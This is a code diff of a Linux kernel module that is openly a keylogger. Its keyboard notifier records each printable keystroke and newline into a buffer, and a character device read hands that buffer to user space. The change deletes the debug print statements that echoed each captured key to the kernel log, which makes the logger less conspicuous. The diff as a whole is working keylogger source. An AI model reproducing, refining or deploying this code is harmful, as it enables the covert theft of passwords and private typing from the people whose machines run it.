@@ -110,22 +110,16 @@ static int keys_pressed(struct notifier_block *nb, unsigned long action,void *da
 		
 		// We will only log those key presses that actually represent an ASCII character.
 		if (c == 0x01){
-			pr_info("[newline]");
 			*keys_buf_ptr = kvmalloc(strlen("[newline]")+1,__GFP_NOMEMALLOC);
-			pr_info("[newline] malloc space");
 			if (*keys_buf_ptr){
 				strcpy(*keys_buf_ptr,"[newline]");
-				pr_info("%s has been writen to the key buff",*keys_buf_ptr);
 			}
 			keys_buf_ptr++;
 			buf_pos++;
 		} else if (c >= 0x20 && c <= 0x7f){
-			pr_info("%s",get_value(c));
 			*keys_buf_ptr = kvmalloc(strlen(get_value(c))+1,__GFP_NOMEMALLOC);
-			pr_info("%s malloc space",get_value(c));
 			if (*keys_buf_ptr){
 				strcpy(*keys_buf_ptr,get_value(c));
-				pr_info("%s has been writen to the key buff",*keys_buf_ptr);
 			}
 			keys_buf_ptr++;
 			buf_pos++;
@@ -154,13 +148,8 @@ static int keys_pressed(struct notifier_block *nb, unsigned long action,void *da
 static ssize_t dev_read(struct file *fp, char __user *buf, size_t length, loff_t *offset){
 	if (*offset > 0 || *keys_usr_ptr == 0)
 		return 0;
-	pr_info("Enter the dev_read function");
 	int len = strlen(*keys_usr_ptr);
-	pr_info("len to read: %d",len);
 	int i =0;
-	for (i = 0; i < 5; i++)
-		pr_info("Testing, string in place %d, is %s",i,keys_buffer[i]);
-	pr_info("keys_usr_ptr: %s sent to user buf",*keys_usr_ptr);
 	int result = copy_to_user(buf, *keys_usr_ptr, len);
 	if (result){
 		pr_info("Couldn't copy all data to user space\n");
@@ -179,7 +168,6 @@ static int __init keyLogger_birth(void){
 		return major;
 	}
 
-	pr_info("Registered keylogger with major number %d",major);
 
 	if((key_logger_class = class_create(THIS_MODULE,DEVICE_NAME))==NULL){
 		pr_info("Class creation failed\n");
